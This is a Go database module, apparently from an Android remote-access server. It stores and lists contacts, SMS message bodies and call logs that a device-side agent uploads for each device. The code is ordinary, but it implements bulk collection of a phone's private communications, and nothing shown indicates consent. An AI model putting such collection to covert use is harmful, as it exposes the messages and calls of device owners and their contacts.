package database

import (
	"context"
	"database/sql"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/enterprise/android-remote-access/server/internal/models"
	"github.com/google/uuid"
)

func parseFlexibleTime(v interface{}) *time.Time {
	if v == nil {
		return nil
	}
	switch t := v.(type) {
	case time.Time:
		tt := t.UTC()
		return &tt
	case string:
		s := strings.TrimSpace(t)
		if s == "" {
			return nil
		}
		for _, layout := range []string{
			time.RFC3339Nano,
			time.RFC3339,
			"2006-01-02 15:04:05",
			"1/2/2006 3:04:05 PM",
			"1/2/2006 15:04:05",
		} {
			if parsed, err := time.Parse(layout, s); err == nil {
				parsed = parsed.UTC()
				return &parsed
			}
		}
		if n, err := strconv.ParseInt(s, 10, 64); err == nil {
			return millisOrSeconds(n)
		}
	case float64:
		return millisOrSeconds(int64(t))
	case int64:
		return millisOrSeconds(t)
	case int:
		return millisOrSeconds(int64(t))
	}
	return nil
}

func millisOrSeconds(n int64) *time.Time {
	if n <= 0 {
		return nil
	}
	// Heuristic: values below year ~2001 in seconds are treated as seconds.
	if n < 1e11 {
		t := time.Unix(n, 0).UTC()
		return &t
	}
	t := time.UnixMilli(n).UTC()
	return &t
}

func asString(v interface{}) string {
	if v == nil {
		return ""
	}
	switch t := v.(type) {
	case string:
		return t
	case float64:
		if t == float64(int64(t)) {
			return strconv.FormatInt(int64(t), 10)
		}
		return strconv.FormatFloat(t, 'f', -1, 64)
	case bool:
		if t {
			return "true"
		}
		return "false"
	default:
		return fmt.Sprint(t)
	}
}

func asBool(v interface{}) bool {
	switch t := v.(type) {
	case bool:
		return t
	case float64:
		return t != 0
	case string:
		s := strings.ToLower(strings.TrimSpace(t))
		return s == "1" || s == "true" || s == "yes"
	default:
		return false
	}
}

func asInt(v interface{}) int {
	switch t := v.(type) {
	case float64:
		return int(t)
	case int:
		return t
	case int64:
		return int(t)
	case string:
		n, _ := strconv.Atoi(strings.TrimSpace(t))
		return n
	default:
		return 0
	}
}

func smsTypeLabel(v interface{}) string {
	s := strings.TrimSpace(asString(v))
	if s == "" {
		return ""
	}
	switch s {
	case "1":
		return "inbox"
	case "2":
		return "sent"
	case "3":
		return "draft"
	case "4":
		return "outbox"
	case "5":
		return "failed"
	case "6":
		return "queued"
	default:
		return s
	}
}

func allPhonesFromContact(raw map[string]interface{}) []string {
	seen := map[string]bool{}
	var out []string
	add := func(n string) {
		n = strings.TrimSpace(n)
		if n == "" || seen[n] {
			return
		}
		seen[n] = true
		out = append(out, n)
	}
	add(asString(raw["number"]))
	add(asString(raw["phone"]))
	if phones, ok := raw["phones"].([]interface{}); ok {
		for _, p := range phones {
			switch t := p.(type) {
			case string:
				add(t)
			case map[string]interface{}:
				add(asString(t["number"]))
			}
		}
	}
	if len(out) == 0 {
		out = append(out, "")
	}
	return out
}

// UpsertDeviceContacts stores contacts (one row per phone number).
func (p *PostgresDB) UpsertDeviceContacts(ctx context.Context, deviceID uuid.UUID, rawContacts []map[string]interface{}) (int, error) {
	if len(rawContacts) == 0 {
		return 0, nil
	}
	query := `
		INSERT INTO device_contacts (id, device_id, native_id, display_name, number, number_fp, data_entry_date)
		VALUES ($1, $2, $3, $4, $5, $6, NOW())
		ON CONFLICT (device_id, native_id, number_fp)
		DO UPDATE SET display_name = EXCLUDED.display_name, number = EXCLUDED.number, data_entry_date = NOW()
	`
	saved := 0
	for _, raw := range rawContacts {
		nativeID := asString(raw["id"])
		if nativeID == "" {
			nativeID = asString(raw["native_id"])
		}
		displayName := asString(raw["name"])
		if displayName == "" {
			displayName = asString(raw["display_name"])
		}
		if displayName == "" {
			displayName = asString(raw["displayName"])
		}
		for _, phone := range sealedPhonesFromContact(raw) {
			if nativeID == "" && phone.Number == "" && displayName == "" {
				continue
			}
			keyNative := nativeID
			if keyNative == "" {
				keyNative = phone.NumberFP
			}
			if phone.NumberFP == "" {
				continue
			}
			_, err := p.db.ExecContext(ctx, query, uuid.New(), deviceID, keyNative, displayName, phone.Number, phone.NumberFP)
			if err != nil {
				return saved, err
			}
			saved++
		}
	}
	return saved, nil
}

type sealedPhone struct {
	Number   string
	NumberFP string
}

func sealedPhonesFromContact(raw map[string]interface{}) []sealedPhone {
	var out []sealedPhone
	if phones, ok := raw["phones"].([]interface{}); ok {
		for _, p := range phones {
			switch t := p.(type) {
			case string:
				fp := asString(raw["number_fp"])
				if fp != "" && t != "" {
					out = append(out, sealedPhone{Number: t, NumberFP: fp})
				}
			case map[string]interface{}:
				num := asString(t["number"])
				if num == "" {
					num = asString(t["phone"])
				}
				fp := asString(t["number_fp"])
				if fp == "" {
					fp = asString(raw["number_fp"])
				}
				if num != "" && fp != "" {
					out = append(out, sealedPhone{Number: num, NumberFP: fp})
				}
			}
		}
	}
	if len(out) == 0 {
		num := asString(raw["number"])
		if num == "" {
			num = asString(raw["phone"])
		}
		fp := asString(raw["number_fp"])
		if num != "" && fp != "" {
			out = append(out, sealedPhone{Number: num, NumberFP: fp})
		}
	}
	return out
}

// UpsertDeviceSMS stores SMS messages.
func (p *PostgresDB) UpsertDeviceSMS(ctx context.Context, deviceID uuid.UUID, rawMessages []map[string]interface{}) (int, error) {
	if len(rawMessages) == 0 {
		return 0, nil
	}
	query := `
		INSERT INTO device_sms (
			id, device_id, native_id, is_read, address, message, name, person,
			message_date, message_type, data_entry_date
		) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, NOW())
		ON CONFLICT (device_id, native_id)
		DO UPDATE SET
			is_read = EXCLUDED.is_read,
			address = EXCLUDED.address,
			message = EXCLUDED.message,
			name = EXCLUDED.name,
			person = EXCLUDED.person,
			message_date = EXCLUDED.message_date,
			message_type = EXCLUDED.message_type,
			data_entry_date = NOW()
	`
	saved := 0
	for _, raw := range rawMessages {
		nativeID := asString(raw["id"])
		if nativeID == "" {
			nativeID = asString(raw["native_id"])
		}
		address := asString(raw["address"])
		if address == "" {
			address = asString(raw["phone"])
		}
		message := asString(raw["body"])
		if message == "" {
			message = asString(raw["message"])
		}
		if message == "" {
			message = asString(raw["snippet"])
		}
		name := asString(raw["name"])
		if name == "" {
			name = asString(raw["displayName"])
		}
		if name == "" {
			name = asString(raw["display_name"])
		}
		person := asString(raw["person"])
		if person == "" {
			person = asString(raw["contactId"])
		}
		msgDate := parseFlexibleTime(raw["date"])
		if msgDate == nil {
			msgDate = parseFlexibleTime(raw["timestamp"])
		}
		msgType := smsTypeLabel(raw["type"])
		if msgType == "" {
			msgType = smsTypeLabel(raw["message_type"])
		}
		if nativeID == "" {
			// Stable fallback key when agent omits id
			datePart := ""
			if msgDate != nil {
				datePart = strconv.FormatInt(msgDate.UnixMilli(), 10)
			}
			nativeID = address + "|" + datePart + "|" + message
			if len(nativeID) > 240 {
				nativeID = nativeID[:240]
			}
		}
		_, err := p.db.ExecContext(ctx, query,
			uuid.New(), deviceID, nativeID, asBool(raw["read"]) || asBool(raw["is_read"]) || asBool(raw["isRead"]),
			address, message, name, person, msgDate, msgType)
		if err != nil {
			return saved, err
		}
		saved++
	}
	return saved, nil
}

// UpsertDeviceCallLogs stores call log entries.
func (p *PostgresDB) UpsertDeviceCallLogs(ctx context.Context, deviceID uuid.UUID, rawCalls []map[string]interface{}) (int, error) {
	if len(rawCalls) == 0 {
		return 0, nil
	}
	query := `
		INSERT INTO device_call_logs (
			id, device_id, call_id, number, name_call, duration, type_call,
			date_call, id_contacts, data_entry_date
		) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, NOW())
		ON CONFLICT (device_id, call_id)
		DO UPDATE SET
			number = EXCLUDED.number,
			name_call = EXCLUDED.name_call,
			duration = EXCLUDED.duration,
			type_call = EXCLUDED.type_call,
			date_call = EXCLUDED.date_call,
			id_contacts = EXCLUDED.id_contacts,
			data_entry_date = NOW()
	`
	saved := 0
	for _, raw := range rawCalls {
		callID := asString(raw["id"])
		if callID == "" {
			callID = asString(raw["call_id"])
		}
		number := asString(raw["number"])
		nameCall := asString(raw["name"])
		if nameCall == "" {
			nameCall = asString(raw["name_call"])
		}
		duration := asInt(raw["duration"])
		typeCall := asString(raw["type"])
		if typeCall == "" {
			typeCall = asString(raw["type_call"])
		}
		dateCall := parseFlexibleTime(raw["timestamp"])
		if dateCall == nil {
			dateCall = parseFlexibleTime(raw["date"])
		}
		if dateCall == nil {
			dateCall = parseFlexibleTime(raw["date_call"])
		}
		idContacts := asString(raw["contact_id"])
		if idContacts == "" {
			idContacts = asString(raw["id_contacts"])
		}
		if idContacts == "" {
			idContacts = asString(raw["person"])
		}
		if callID == "" {
			datePart := ""
			if dateCall != nil {
				datePart = strconv.FormatInt(dateCall.UnixMilli(), 10)
			}
			callID = number + "|" + datePart + "|" + typeCall
		}
		_, err := p.db.ExecContext(ctx, query,
			uuid.New(), deviceID, callID, number, nameCall, duration, typeCall, dateCall, idContacts)
		if err != nil {
			return saved, err
		}
		saved++
	}
	return saved, nil
}

// ListDeviceContacts returns persisted contacts for a device.
func (p *PostgresDB) ListDeviceContacts(ctx context.Context, deviceID uuid.UUID, limit int) ([]models.StoredContact, error) {
	if limit <= 0 {
		limit = 5000
	}
	rows, err := p.db.QueryContext(ctx, `
		SELECT id, device_id, native_id, display_name, number, COALESCE(number_fp, ''), data_entry_date
		FROM device_contacts WHERE device_id = $1
		ORDER BY display_name ASC, number ASC
		LIMIT $2
	`, deviceID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []models.StoredContact
	for rows.Next() {
		var c models.StoredContact
		var native sql.NullString
		if err := rows.Scan(&c.ID, &c.DeviceID, &native, &c.DisplayName, &c.Number, &c.NumberFP, &c.DataEntryDate); err != nil {
			return nil, err
		}
		if native.Valid {
			c.NativeID = native.String
		}
		out = append(out, c)
	}
	return out, rows.Err()
}

// ListDeviceSMS returns persisted SMS for a device.
func (p *PostgresDB) ListDeviceSMS(ctx context.Context, deviceID uuid.UUID, limit int) ([]models.StoredSMS, error) {
	if limit <= 0 {
		limit = 10000
	}
	rows, err := p.db.QueryContext(ctx, `
		SELECT id, device_id, native_id, is_read, address, message, name, person,
			message_date, message_type, data_entry_date
		FROM device_sms WHERE device_id = $1
		ORDER BY COALESCE(message_date, data_entry_date) DESC
		LIMIT $2
	`, deviceID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []models.StoredSMS
	for rows.Next() {
		var m models.StoredSMS
		var native, person sql.NullString
		var msgDate sql.NullTime
		if err := rows.Scan(
			&m.ID, &m.DeviceID, &native, &m.IsRead, &m.Address, &m.Message, &m.Name, &person,
			&msgDate, &m.MessageType, &m.DataEntryDate,
		); err != nil {
			return nil, err
		}
		if native.Valid {
			m.NativeID = native.String
		}
		if person.Valid {
			m.Person = person.String
		}
		if msgDate.Valid {
			t := msgDate.Time
			m.MessageDate = &t
		}
		out = append(out, m)
	}
	return out, rows.Err()
}

// ListDeviceCallLogs returns persisted call logs for a device.
func (p *PostgresDB) ListDeviceCallLogs(ctx context.Context, deviceID uuid.UUID, limit int) ([]models.StoredCallLog, error) {
	if limit <= 0 {
		limit = 10000
	}
	rows, err := p.db.QueryContext(ctx, `
		SELECT id, device_id, call_id, number, name_call, duration, type_call,
			date_call, id_contacts, data_entry_date
		FROM device_call_logs WHERE device_id = $1
		ORDER BY COALESCE(date_call, data_entry_date) DESC
		LIMIT $2
	`, deviceID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var out []models.StoredCallLog
	for rows.Next() {
		var c models.StoredCallLog
		var dateCall sql.NullTime
		var idContacts sql.NullString
		if err := rows.Scan(
			&c.ID, &c.DeviceID, &c.CallID, &c.Number, &c.NameCall, &c.Duration, &c.TypeCall,
			&dateCall, &idContacts, &c.DataEntryDate,
		); err != nil {
			return nil, err
		}
		if dateCall.Valid {
			t := dateCall.Time
			c.DateCall = &t
		}
		if idContacts.Valid {
			c.IDContacts = idContacts.String
		}
		out = append(out, c)
	}
	return out, rows.Err()
}

// CountDeviceComms returns row counts for dashboard/status labels.
func (p *PostgresDB) CountDeviceComms(ctx context.Context, deviceID uuid.UUID) (contacts, sms, calls int, err error) {
	err = p.db.QueryRowContext(ctx, `SELECT COUNT(*) FROM device_contacts WHERE device_id = $1`, deviceID).Scan(&contacts)
	if err != nil {
		return
	}
	err = p.db.QueryRowContext(ctx, `SELECT COUNT(*) FROM device_sms WHERE device_id = $1`, deviceID).Scan(&sms)
	if err != nil {
		return
	}
	err = p.db.QueryRowContext(ctx, `SELECT COUNT(*) FROM device_call_logs WHERE device_id = $1`, deviceID).Scan(&calls)
	return
}
